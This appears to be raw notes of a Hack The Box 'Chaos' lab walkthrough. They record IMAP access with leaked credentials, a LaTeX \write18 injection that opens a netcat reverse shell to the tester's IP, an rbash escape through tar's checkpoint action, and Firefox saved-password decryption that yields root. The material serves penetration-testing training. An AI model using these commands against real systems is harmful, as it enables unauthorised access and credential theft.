@@ -1,0 +1,473 @@
+Connecting to http via direct ip is disallowed, put ip in /etc/hosts/ and retry
+
+Webmin 1.890
+https://chaos.htb:10000/session_login.cgi
+RCE is possible via CVE
+
+pop3 and imap
+only ssl allowed, port 995, 993
+
+
+root@kali:~/HTB/Chaos# openssl s_client -connect chaos.htb:995
+CONNECTED(00000003)
+depth=0 CN = chaos
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = chaos
+verify return:1
+---
+Certificate chain
+ 0 s:CN = chaos
+   i:CN = chaos
+.....
+
+
+user chaos
++OK
+pass chaos
+-ERR [AUTH] Authentication failed.
+
+
+root@kali:~/HTB/Chaos# openssl s_client -connect chaos.htb:993 -crlf
+CONNECTED(00000003)
+depth=0 CN = chaos
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = chaos
+.......
+
+login chaos chaos
+login BAD First parameter in line is IMAP's command tag, not the command name. Add that before the command, like: a login user pass
+
+a1 login chaos chaos
+a1 NO [AUTHENTICATIONFAILED] Authentication failed.
+
+
+
+http://10.10.10.120/wp/wordpress
+password: human
+
+Creds for webmail(pop3) :
+username – ayush
+password – jiujitsu
+
+
+
+root@kali:~/HTB/Chaos# openssl s_client -connect chaos.htb:993 -crlf
+CONNECTED(00000003)
+depth=0 CN = chaos
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = chaos
+......
+a1 login ayush jiujitsu
+a1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
+a1 list "" "*"
+* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
+* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
+* LIST (\HasNoChildren) "/" INBOX
+a1 OK List completed (0.001 + 0.000 secs).
+a1 select inbox
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1540728609] UIDs valid
+* OK [UIDNEXT 1] Predicted next UID
+* OK [HIGHESTMODSEQ 1] Highest
+a1 OK [READ-WRITE] Select completed (0.001 + 0.000 + 0.001 secs).
+a1 examine Drafts
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 1 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1540728611] UIDs valid
+* OK [UIDNEXT 5] Predicted next UID
+a1 OK [READ-ONLY] Examine completed (0.002 + 0.000 + 0.001 secs).
+
+
+a1 list "\Draft" "*"
+* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
+a1 OK List completed (0.001 + 0.000 secs).
+a1 list "\Inbox" "*"
+* LIST (\HasNoChildren) "/" INBOX
+a1 OK List completed (0.001 + 0.000 secs).
+
+
+
+
+root@kali:~/HTB/Chaos# openssl s_client -connect chaos.htb:993 -crlf
+CONNECTED(00000003)
+depth=0 CN = chaos
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = chaos
+......
+a1 login ayush jiujitsu
+a1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
+a2 list "" "*"
+* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
+* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
+* LIST (\HasNoChildren) "/" INBOX
+a2 OK List completed (0.001 + 0.000 secs).
+a2 select Drafts
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+* 1 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1540728611] UIDs valid
+* OK [UIDNEXT 5] Predicted next UID
+a2 OK [READ-WRITE] Select completed (0.002 + 0.000 + 0.001 secs).
+a4 fetch 1 rfc822.text
+* 1 FETCH (RFC822.TEXT {2183}
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+
+Hii, sahay
+Check the enmsg.txt
+You are the password XD.
+Also attached the script which i used to encrypt.
+Thanks,
+Ayush
+
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: base64
+Content-Type: application/octet-stream;
+ name=enim_msg.txt
+Content-Disposition: attachment;
+ filename=enim_msg.txt;
+ size=272
+
+MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
+RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
+7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
+6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
++l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: base64
+Content-Type: text/x-python; charset=us-ascii;
+ name=en.py
+Content-Disposition: attachment;
+ filename=en.py;
+ size=804
+
+ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
+dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
+dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
+CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
+IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
+RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
+ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
+ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
+a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
+ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
+ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
+KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
+KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
+KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
+c3QoKQoK
+--=_00b34a28b9033c43ed09c0950f4176e1--
+)
+a4 OK Fetch completed (0.002 + 0.000 + 0.001 secs).
+
+
+
+root@kali:~/HTB/Chaos# cat odedecode.txt
+Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+
+---------------------------------------------------------------------------------------------
+
+POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1
+
+Host: chaos.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Content-Length: 28
+
+Connection: close
+
+
+
+content=hello&template=test1
+
+
+HTTP/1.1 200 OK
+
+Date: Thu, 02 May 2019 07:25:38 GMT
+
+Server: Apache/2.4.34 (Ubuntu)
+
+Vary: Accept-Encoding
+
+Content-Length: 3405
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+
+
+LOG:
+This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
+ \write18 enabled.
+entering extended mode
+(./8355da58edde5232f7ab13b45e90de8b.tex
+LaTeX2e <2018-04-01> patch level 5
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/sc..............................
+
+---------------------------------------------------------------------------------------------------
+
+
+execute: \immediate\write18{nc 10.10.12.178 4444 -e /bin/sh}
+
+and we got outputs: tcpdump -i tun0 icmp -n
+
+
+------------------------------------------------------------------
+
+
+root@kali:~/HTB/Chaos# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.12.178] from chaos.htb [10.10.10.120] 35068
+/bin/sh: 0: can't access tty; job control turned off
+$ pwd
+/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile
+$ ls -a
+.
+..
+.texlive2018
+........
+$ whoami
+www-data
+$ uname -a
+Linux chaos 4.18.0-12-generic #13-Ubuntu SMP Wed Nov 14 15:17:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+$ env
+OLDPWD=/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile/.texlive2018/texmf-var/fonts/pk/ljfour/jknappen/ec
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=9:19753
+SELFAUTOLOC=/usr/bin
+SELFAUTODIR=/usr
+SELFAUTOPARENT=/
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=af7b4f450fdb45c1afd125ca94ca372f
+APACHE_LOCK_DIR=/var/lock/apache2
+engine=pdftex
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+SELFAUTOGRANDPARENT=/
+PWD=/home
+progname=pdflatex
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/gpasswd
+/bin/ntfs-3g
+/bin/su
+/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+
+
+$ su ayush 
+su ayush
+Password: jiujitsu
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ whoami
+whoami
+rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ echo $PATH
+echo $PATH
+/home/ayush/.app
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ export -p
+export -p
+declare -x APACHE_LOCK_DIR="/var/lock/apache2"
+declare -x APACHE_LOG_DIR="/var/log/apache2"
+declare -x APACHE_PID_FILE="/var/run/apache2/apache2.pid"
+declare -x APACHE_RUN_DIR="/var/run/apache2"
+declare -x APACHE_RUN_GROUP="www-data"
+declare -x APACHE_RUN_USER="www-data"
+declare -x HOME="/home/ayush"
+declare -x INVOCATION_ID="248413143a084eb59e91fa1c0d02c5b3"
+declare -x JOURNAL_STREAM="9:19670"
+declare -x LANG="en_US.UTF-8"
+declare -x LOGNAME="ayush"
+declare -x MAIL="/var/mail/ayush"
+declare -x OLDPWD="/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3"
+declare -rx PATH="/home/ayush/.app"
+declare -x PWD="/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile"
+declare -x SELFAUTODIR="/usr"
+declare -x SELFAUTOGRANDPARENT="/"
+declare -x SELFAUTOLOC="/usr/bin"
+declare -x SELFAUTOPARENT="/"
+declare -rx SHELL="/opt/rbash"
+declare -x SHLVL="1"
+declare -x USER="ayush"
+declare -x XDG_RUNTIME_DIR="/run/user/1001"
+declare -x XDG_SESSION_ID="c2"
+declare -x engine="pdftex"
+declare -x progname="pdflatex"
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ echo $PATH
+echo $PATH
+/home/ayush/.app
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ echo /home/ayush/.app/*
+<_f1Nd_n07H1n9_H3r3/compile$ echo /home/ayush/.app/*          
+/home/ayush/.app/dir /home/ayush/.app/ping /home/ayush/.app/tar
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ dir
+dir
+7ea8735661db025610f600908ae6a626.aux  8eac57def822af1b3d3c3f8904246284.log
+7ea8735661db025610f600908ae6a626.log  8eac57def822af1b3d3c3f8904246284.tex
+7ea8735661db025610f600908ae6a626.tex  missfont.log
+8eac57def822af1b3d3c3f8904246284.aux
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ dir /home
+dir /home
+ayush  sahay
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ dir /home/ayush
+dir /home/ayush
+mail  user.txt
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ echo "$(</home/ayush/user.txt)"
+<7H1n9_H3r3/compile$ echo "$(</home/ayush/user.txt)"          
+eef39126d9c3b4b8a30286970dc713e1
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ 
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ dir -a /home/ayush/.mozilla/firefox/bzo7sjt1.default
+<ir -a /home/ayush/.mozilla/firefox/bzo7sjt1.default          
+.			crashes		    pluginreg.dat
+..			datareporting	    prefs.js
+addons.json		extensions.ini	    revocations.txt
+AlternateServices.txt	extensions.json     saved-telemetry-pings
+blocklist-addons.json	formhistory.sqlite  search.json.mozlz4
+blocklist-gfx.json	gmp		    SecurityPreloadState.txt
+blocklist-plugins.json	key4.db		    sessionCheckpoints.json
+blocklist.xml		kinto.sqlite	    sessionstore-backups
+bookmarkbackups		logins.json	    SiteSecurityServiceState.txt
+cert9.db		mimeTypes.rdf	    storage
+cert_override.txt	minidumps	    storage.sqlite
+compatibility.ini	.parentlock	    times.json
+containers.json		permissions.sqlite  webappsstore.sqlite
+content-prefs.sqlite	pkcs11.txt	    webappsstore.sqlite-shm
+cookies.sqlite		places.sqlite	    webappsstore.sqlite-wal
+cookies.sqlite-shm	places.sqlite-shm   xulstore.json
+cookies.sqlite-wal	places.sqlite-wal
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ echo "$(</home/ayush/.mozilla/firefox/bzo7sjt1.default/logins.json)"
+<ush/.mozilla/firefox/bzo7sjt1.default/logins.json)"          
+{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ 
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ export PATH=$PATH:/bin/sh
+<1Nd_n07H1n9_H3r3/compile$ export PATH=$PATH:/bin/sh          
+rbash: PATH: readonly variable
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ export PATH=/bin/sh
+<w1ll_f1Nd_n07H1n9_H3r3/compile$ export PATH=/bin/sh          
+rbash: PATH: readonly variable
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh
+<ile --checkpoint=1 --checkpoint-action=exec=/bin/sh          
+tar: testfile: Cannot stat: No such file or directory
+$ echo $PATH
+echo $PATH
+/home/ayush/.app:/bin/sh
+
+$  cp 
+cp
+/bin/sh: 6: cp: not found
+$ dir          
+dir
+/bin/sh: 7: dir: not found
+$ pwd
+pwd
+/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile
+$ whoami
+whoami
+/bin/sh: 5: whoami: not found
+$ export PATH=$PATH:/usr/local/sbin
+export PATH=$PATH:/usr/local/sbin
+$ export PATH=$PATH:/usr/local/bin
+export PATH=$PATH:/usr/local/bin
+$ export PATH=$PATH:/usr/sbin
+export PATH=$PATH:/usr/sbin
+$ export PATH=$PATH:/usr/bin
+export PATH=$PATH:/usr/bin
+$ export PATH=$PATH:/sbin
+export PATH=$PATH:/sbin
+$ export PATH=$PATH:/bin
+export PATH=$PATH:/bin
+$ ls
+ls
+8b636d5126957aa120a588d48dba859e.aux  e0fc8a12b47fa35274176c79d2b3287b.aux
+8b636d5126957aa120a588d48dba859e.log  e0fc8a12b47fa35274176c79d2b3287b.log
+8b636d5126957aa120a588d48dba859e.tex  e0fc8a12b47fa35274176c79d2b3287b.tex
+c940ffb0d67b37d2621d062760a145ef.aux  firefox_decrypt.py
+c940ffb0d67b37d2621d062760a145ef.log  missfont.log
+c940ffb0d67b37d2621d062760a145ef.tex
+$ echo $PATH
+echo $PATH
+/home/ayush/.app:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+ cp firefox_decrypt.py /home/ayush
+cp firefox_decrypt.py /home/ayush
+$ cd /home/ayush
+cd /home/ayush
+$ ls
+ls
+firefox_decrypt.py  mail  user.txt
+$ python firefox_decrypt.py
+python firefox_decrypt.py
+
+Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: jiujitsu
+
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+$  su root 
+su root
+Password: Thiv8wrej~
+
+root@chaos:/home/ayush# cat /root/root.txt
+cat /root/root.txt
+4eca7e09e3520e020884563cfbabbc70
+root@chaos:/home/ayush# 
+
+
+
